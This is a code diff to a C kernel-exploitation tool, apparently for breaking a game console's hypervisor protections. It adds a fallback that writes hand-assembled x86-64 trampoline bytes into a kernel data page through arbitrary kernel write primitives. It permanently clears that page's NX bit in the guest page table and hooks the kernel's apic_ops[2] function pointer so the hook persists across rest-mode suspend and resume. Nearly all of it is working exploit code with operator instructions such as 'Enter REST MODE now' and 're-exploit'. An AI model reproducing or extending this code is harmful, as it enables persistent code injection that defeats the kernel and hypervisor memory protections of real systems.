@@ -4054,6 +4054,117 @@ ring3_fallback:
                     printf("\n");
                     fflush(stdout);
                 }
+
+                /* ─── Phase 5b: kdata Cave Trampoline (fallback) ───
+                 *
+                 * If the kmod trampoline scanner failed (module pages are
+                 * NPT-protected against DMAP reads), we build a self-contained
+                 * trampoline_xapic_mode function directly in the kdata code cave.
+                 *
+                 * We've already proven:
+                 *   - NPT allows execution on kdata pages (X bit set in NPT)
+                 *   - Guest PTE NX-clear makes kdata executable (ring-0 test passed)
+                 *   - kdata cave at kdata_base is writable via DMAP
+                 *
+                 * The trampoline is 28 bytes: 20 bytes of code + 8 bytes for
+                 * g_trampoline_target.  Placed at kdata_base + 0x100 (after
+                 * the 32-byte Phase 7 persistence marker at kdata_base + 0x00).
+                 *
+                 * Machine code:
+                 *   mov rax, [rip+0x0d]   ; load g_trampoline_target
+                 *   test rax, rax          ; NULL check
+                 *   jz .fallback           ; if NULL, return 1
+                 *   jmp rax               ; tail-call original xapic_mode
+                 * .fallback:
+                 *   mov eax, 1            ; APIC_MODE_XAPIC (required for LAPIC)
+                 *   ret
+                 * g_trampoline_target:
+                 *   .quad 0               ; patched by Phase 7 with original xapic
+                 */
+                #define CAVE_TRAMP_OFFSET  0x100  /* offset within kdata_base page */
+                #define CAVE_TRAMP_CODE_SZ 20     /* bytes of executable code */
+                #define CAVE_TRAMP_TOTAL   28     /* code + 8-byte target variable */
+
+                if (!g_kmod_trampoline_func) {
+                    printf("=============================================\n");
+                    printf("  Phase 5b: kdata Cave Trampoline (fallback)\n");
+                    printf("=============================================\n\n");
+                    printf("[*] Kmod trampoline unavailable — building in kdata cave.\n");
+                    fflush(stdout);
+
+                    static const uint8_t cave_tramp_code[CAVE_TRAMP_TOTAL] = {
+                        /* mov rax, [rip+0x0d] — load target from offset 20 */
+                        0x48, 0x8b, 0x05, 0x0d, 0x00, 0x00, 0x00,
+                        /* test rax, rax */
+                        0x48, 0x85, 0xc0,
+                        /* jz +2 (skip jmp rax, go to mov eax,1) */
+                        0x74, 0x02,
+                        /* jmp rax — tail-call original */
+                        0xff, 0xe0,
+                        /* mov eax, 1 — fallback: return APIC_MODE_XAPIC */
+                        0xb8, 0x01, 0x00, 0x00, 0x00,
+                        /* ret */
+                        0xc3,
+                        /* g_trampoline_target (8 bytes, initialized to 0) */
+                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                    };
+
+                    uint64_t tramp_cave_kva = target_kva + CAVE_TRAMP_OFFSET;
+                    uint64_t tramp_cave_pa  = target_pa + CAVE_TRAMP_OFFSET;
+
+                    /* Write trampoline to kdata cave via DMAP */
+                    printf("[*] Writing trampoline to kdata+0x%x (KVA=0x%lx, PA=0x%lx)...\n",
+                           CAVE_TRAMP_OFFSET,
+                           (unsigned long)tramp_cave_kva,
+                           (unsigned long)tramp_cave_pa);
+                    kernel_copyin((void *)cave_tramp_code,
+                                  g_dmap_base + tramp_cave_pa,
+                                  CAVE_TRAMP_TOTAL);
+
+                    /* Verify write */
+                    uint8_t tramp_verify[CAVE_TRAMP_TOTAL];
+                    kernel_copyout(g_dmap_base + tramp_cave_pa,
+                                   tramp_verify, CAVE_TRAMP_TOTAL);
+                    int tramp_ok = (memcmp(cave_tramp_code, tramp_verify,
+                                           CAVE_TRAMP_TOTAL) == 0);
+                    printf("    Write verify: %s\n", tramp_ok ? "OK" : "MISMATCH");
+
+                    if (tramp_ok) {
+                        /* Clear NX+G in guest PTE for kdata_base page — PERMANENT.
+                         * This makes the page executable for the trampoline.
+                         * NPT already allows X on this PA (confirmed by ring-0 test). */
+                        uint64_t new_pte = orig_pte & ~((1ULL << 63) | (1ULL << 8));
+                        kernel_copyin(&new_pte, g_dmap_base + pte_pa, 8);
+
+                        uint64_t pte_readback = 0;
+                        kernel_copyout(g_dmap_base + pte_pa, &pte_readback, 8);
+                        printf("[*] Guest PTE NX cleared (permanent): 0x%016lx [%s]\n",
+                               (unsigned long)pte_readback,
+                               pte_readback == new_pte ? "OK" : "FAIL");
+
+                        if (pte_readback == new_pte) {
+                            g_kmod_trampoline_func = tramp_cave_kva;
+                            g_kmod_trampoline_target = tramp_cave_kva +
+                                                       CAVE_TRAMP_CODE_SZ;
+
+                            printf("\n[+] ============================================\n");
+                            printf("[+]  CAVE TRAMPOLINE INSTALLED\n");
+                            printf("[+] ============================================\n");
+                            printf("[+] trampoline_xapic_mode() = 0x%016lx\n",
+                                   (unsigned long)g_kmod_trampoline_func);
+                            printf("[+] g_trampoline_target     = 0x%016lx\n",
+                                   (unsigned long)g_kmod_trampoline_target);
+                            printf("[+] Guest PTE NX permanently cleared for this page.\n");
+                            printf("[+] Phase 7 can now arm apic_ops[2] hook.\n");
+                        } else {
+                            printf("[-] PTE write failed — trampoline NOT installed.\n");
+                        }
+                    } else {
+                        printf("[-] Trampoline write verify failed.\n");
+                    }
+                    printf("\n");
+                    fflush(stdout);
+                }
             } else if (buf_check != 0) {
                 printf("[?] Buffer has unexpected value: 0x%lx\n",
                        (unsigned long)buf_check);
@@ -4961,10 +5072,14 @@ static void campaign_flatz_setup(void) {
             printf("    QA marker: 0x%08x [%s]\n", mv,
                    mv == PHASE7_MARKER ? "OK" : "FAIL");
 
-            /* ── Step 3: Hook apic_ops[2] with KLD trampoline ── */
+            /* ── Step 3: Hook apic_ops[2] with trampoline ── */
             int hook_armed = 0;
+            int hook_is_cave = (g_kmod_trampoline_func &&
+                                g_kmod_trampoline_func >= g_kdata_base &&
+                                g_kmod_trampoline_func < g_kdata_base + 0x1000);
             if (g_kmod_trampoline_func && g_kmod_trampoline_target) {
-                printf("\n[*] Step 3: Hooking apic_ops[2] → KLD trampoline...\n");
+                printf("\n[*] Step 3: Hooking apic_ops[2] → %s trampoline...\n",
+                       hook_is_cave ? "cave" : "KLD");
                 printf("    trampoline_xapic_mode() = 0x%016lx\n",
                        (unsigned long)g_kmod_trampoline_func);
                 printf("    g_trampoline_target     = 0x%016lx\n",
@@ -5019,13 +5134,16 @@ static void campaign_flatz_setup(void) {
             printf("[+]   Cave marker:    FLATZHOO + original xapic\n");
             printf("[+]   QA flags:       Phase 7 marker + original xapic\n");
             if (hook_armed) {
-                printf("[+]   apic_ops[2]:    HOOKED → KLD trampoline\n");
+                printf("[+]   apic_ops[2]:    HOOKED → %s trampoline\n",
+                       hook_is_cave ? "cave" : "KLD");
                 printf("[+]     trampoline calls original xapic_mode\n");
                 printf("[+]     Returns correct APIC mode — safe for suspend\n");
+                if (hook_is_cave)
+                    printf("[+]     Guest PTE NX permanently cleared for cave page\n");
             } else {
                 printf("[+]   apic_ops[2]:    UNCHANGED (0x%016lx)\n",
                        (unsigned long)original_xapic);
-                printf("[+]     KLD trampoline unavailable — hook not armed\n");
+                printf("[+]     Trampoline unavailable — hook not armed\n");
             }
             printf("[+]\n");
             printf("[+] CONFIRMED from previous tests:\n");
@@ -5037,7 +5155,8 @@ static void campaign_flatz_setup(void) {
             if (hook_armed) {
                 printf("[+] ACTION: Enter REST MODE now!\n");
                 printf("[+]   On resume: cpususpend_handler calls xapic_mode\n");
-                printf("[+]   → KLD trampoline → original → returns normally\n");
+                printf("[+]   → %s trampoline → original → returns normally\n",
+                       hook_is_cave ? "cave" : "KLD");
                 printf("[+]   Wake → re-exploit → re-run tool → check results\n");
             } else {
                 printf("[+] NOTE: Hook not armed. Enter REST MODE to test\n");
